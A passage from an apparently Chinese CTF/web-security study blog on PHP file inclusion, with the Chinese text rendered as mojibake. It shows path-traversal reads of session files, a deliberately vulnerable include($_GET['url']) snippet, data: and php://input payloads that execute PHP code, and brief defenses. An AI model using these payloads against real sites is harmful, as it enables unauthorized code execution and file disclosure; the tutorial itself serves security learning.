<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">é»˜è®¤ä½ç½®</span><br><span class="line">/tmp/(PHP Sessions)</span><br><span class="line">ä¹Ÿå¯èƒ½</span><br><span class="line">/var/lib/php/session/(PHP Sessions)</span><br><span class="line">/var/lib/php5/(PHP Sessions)</span><br><span class="line">c:/windows/temp/(PHP Sessions)ç­‰æ–‡ä»¶ä¸­ã€‚</span><br></pre></td></tr></table></figure>
<p>å°è¯•è¯»å–<strong>session</strong>æ–‡ä»¶<strong>?file=../../../../../../tmp/sess_tnrdo9ub2tsdurntv0pdir1no7</strong>ã€‚
åœ¨æŸäº›ç‰¹å®šçš„æƒ…å†µä¸‹å¦‚æœä½ èƒ½å¤Ÿæ§åˆ¶<strong>session</strong>çš„å€¼ï¼Œä¹Ÿè®¸èƒ½å¤Ÿè·å¾—ä¸€ä¸ª<strong>shell</strong>ã€‚</p>
<h3 id="rfiè¿œç¨‹æ–‡ä»¶åŒ…å«">RFIã€è¿œç¨‹æ–‡ä»¶åŒ…å«</h3>
<h4
id="å½“allow_url_fopenonä¸allow_url_includeonæ—¶">å½“allow_url_fopen=Onä¸allow_url_include=Onæ—¶</h4>
<p>è¿™ä¸ªæ—¶å€™åº”å½“æ˜¯æœ€ç®€å•æœ€å®¹æ˜“ç†è§£çš„<strong>RFI</strong>äº†ã€‚</p>
<p>å‡è®¾ç°åœ¨å¯¹è±¡æ–‡ä»¶æ˜¯<strong>index.php</strong>ï¼Œä»£ç å¦‚ä¸‹ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$url</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>å¯ä»¥ç›´æ¥æ„é€ <strong>url=http://localhost/phpinfo.php</strong>è¿™æ ·è¿›è¡Œæ”»å‡»ã€‚</p>
<p>å¦å¤–è¿˜æœ‰ä¸€ç§æ–¹æ³•æ˜¯<a
target="_blank" rel="noopener" href="http://www.php.net/manual/zh/wrappers.data.php"><strong>dataï¼š</strong></a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url=data:text/plain,<span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>()<span class="meta">?&gt;</span></span><br><span class="line">url=data:text/plain,<span class="meta">&lt;?php</span> <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(â€œ.â€));<span class="meta">?&gt;</span></span><br><span class="line">url=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br></pre></td></tr></table></figure>
<h4
id="å½“allow_url_fopenonä¸allow_url_includeoffæ—¶">å½“allow_url_fopen=Onä¸allow_url_include=Offæ—¶</h4>
<p>è¿™ä¸ªæ—¶å€™åªèƒ½è¿›è¡Œè¿œç¨‹æ–‡ä»¶æ‰“å¼€ï¼Œå¦‚åŒå…¨<strong>On</strong>çš„ç¬¬ä¸€æ¡ä¸€æ ·ã€‚</p>
<h4
id="å½“allow_url_fopenoffä¸allow_url_includeonæ—¶">å½“allow_url_fopen=Offä¸allow_url_include=Onæ—¶</h4>
<p>è¿™ä¸ªæ—¶å€™åªèƒ½ä½¿ç”¨ä¸€äº›ä¼ªåè®®å¦‚<strong>php://input</strong>ã€<strong>php://stdin</strong>ã€<strong>php://memory</strong>å’Œ<strong>php://temp</strong>ç­‰æ¥è¿›è¡Œæ”»å‡»ã€‚</p>
<p>ä¾‹å¦‚å¯ä»¥ä½¿ç”¨<strong>php://input</strong>ï¼Œæ¥æ‰§è¡ŒåŒæ—¶<strong>post</strong>è¿‡å»çš„æ¶æ„ä»£ç ã€‚</p>
<h3 id="é˜²å¾¡æ–¹æ³•">é˜²å¾¡æ–¹æ³•</h3>
<ol type="1">
<li><p>è®¿é—®æƒé™è¦æœ‰æ§åˆ¶ã€‚</p></li>
<li><p>ä½¿ç”¨ç™½åå•éªŒè¯è¢«è®¿é—®çš„æ–‡ä»¶ã€‚</p></li>
<li><p>è¿‡æ»¤<strong>../</strong>è¿™æ ·çš„ä¼ å…¥å‚æ•°ã€‚</p></li>
</ol>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/Web/" rel="tag"><i class="fa fa-tag"></i> Web</a>
              <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
              <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag"><i class="fa fa-tag"></i> æ–‡ä»¶åŒ…å«</a>
              <a href="/tags/Web%E5%AE%89%E5%85%A8%E4%BF%AE%E7%82%BC%E8%AE%A1%E5%88%92/" rel="tag"><i class="fa fa-tag"></i> Webå®‰å…¨ä¿®ç‚¼è®¡åˆ’</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/Study-Upload-Labs/" rel="prev" title="Webå®‰å…¨æ–‡ä»¶ä¸Šä¼ ä¿®ç‚¼è®¡åˆ’">
                  <i class="fa fa-chevron-left"></i> Webå®‰å…¨æ–‡ä»¶ä¸Šä¼ ä¿®ç‚¼è®¡åˆ’
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/Study-XSS/" rel="next" title="Webå®‰å…¨XSSä¿®ç‚¼è®¡åˆ’">
                  Webå®‰å…¨XSSä¿®ç‚¼è®¡åˆ’ <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






    
  <div class="comments disqusjs-container">
    <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
  </div>
  
</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  <script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
  <script src="/live2d-widget/autoload.js"></script>
  &copy; 2018 â€“ 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">å—æºŸNaN</span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="æ€»è®¿å®¢é‡">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="æ€»è®¿é—®é‡">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>

    </div>
  </footer>

  
  <div class="reading-progress-bar"></div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>







  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>




  

  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
<script src="/js/third-party/math/mathjax.js"></script>


<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/disqusjs/3.0.2/styles/disqusjs.css" integrity="sha256-71XarXwNr1Td27HmZI9zjY+rMzRdush6/glo6VFXp7o=" crossorigin="anonymous">

<script class="next-config" data-name="disqusjs" type="application/json">{"enable":true,"api":"https://disqus.skk.moe/disqus/","apikey":"Cz7uQCDoGwWYGv80HeDq40mZr1rrmYy9tHhCpcWG95DFzOD1TJKLXtbTxFqWBCr5","shortname":"southseast","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/disqusjs/3.0.2/disqusjs.es2015.umd.min.js","integrity":"sha256-okP99ZQKVpIy7+NogAMpGlIQzJa9XKXhIJcFgdju5bU="}}</script>
<script src="/js/third-party/comments/disqusjs.js"></script>

</body>
</html>
